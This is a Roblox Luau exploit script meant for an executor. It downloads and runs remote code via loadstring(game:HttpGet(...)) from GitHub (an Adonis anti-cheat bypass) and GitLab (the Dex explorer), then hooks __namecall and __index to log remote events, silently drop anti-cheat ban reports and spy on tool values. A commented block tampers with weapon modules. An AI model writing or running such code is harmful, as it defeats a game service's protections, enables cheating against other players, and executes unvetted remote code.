local function ToString(v:any, depth: number?)
    local dataType = typeof(v)
    local str;

    if dataType == "Instance" then
        dataType = v.ClassName
        str = v:GetFullName()
    else
        if dataType == "table" then
            depth = depth or 0
            local depthShit = string.rep("\t", depth)
            str = "{\n"
            for i, c in v do
                str = str .. string.format(depthShit .. "\t[%s]: %s,\n", tostring(i), ToString(c, depth + 1))
            end
            str = str .. depthShit .. "}"
        elseif dataType == "string" then
            str = string.format("%q", v)
        else
            str = tostring(v)
        end
    end

    return string.format("(%s) %s", dataType, str)
end

--anticheat overhaul
--disable adonis
loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua", true))()
--disable anti-cheat
local old; old = hookmetamethod(game, "__namecall", function(self: RemoteEvent, ...)
    if not checkcaller() and typeof(self) == "Instance" and (self.ClassName == "RemoteEvent" or self.ClassName == "UnreliableRemoteEvent" or self.ClassName == "RemoteFunction") then
        local method = getnamecallmethod()
        if method == "FireServer" or method == "fireServer" or method == "InvokeServer" or method == "invokeServer" then
            local args = {...}
            warn("Remote: ", ToString(self), "Args: ", ToString(args))

            if args[1] == "gone" then
                return
            end
            if self.Name == "IWantToBeBanned" then
                return
            end
        end
    end
    return old(self, ...)
end)

--dex
loadstring(game:HttpGet("https://gitlab.com/sens3/assets/-/raw/main/OptimizedDexForSolara.lua?ref_type=heads"))()


--
--[[
local thing = require(game:GetService("ReplicatedStorage"):WaitForChild("PHRST"):WaitForChild("ShellModules"))
local clone = table.clone(thing)

table.clear(thing)
setmetatable(thing, {
    __index = function(self, i)

        return clone["InfGuns:JDAMTest"]
    end
})
]]

local player = game:GetService("Players").LocalPlayer
local old; old = hookmetamethod(game, "__index", function(self: ValueBase, i, ...)
    if not checkcaller() and typeof(i) == "string" and i == "Value" and typeof(self) == "Instance" and self:IsA("Tool") then
        local parent = old(self, "Parent") 
        if parent and self:IsDescendantOf(player) or self:IsDescendantOf(player.Character) then
            warn(i, ToString(self), debug.info(3, "s"))
        end
    end
    return old(self, i, ...)
end)

--[[


local old; old = hookmetamethod(game, "__newindex", function(self: ValueBase, i, v, ...)
    if not checkcaller() and typeof(i) == "string" and i == "Value" and typeof(self) == "Instance" then
        local selfName = self.Name
        if selfName == "CurrentlyLoaded" and v == "Unloaded" or not v then
            return 
        end
    end
    return old(self, i, v, ...)
end)
]]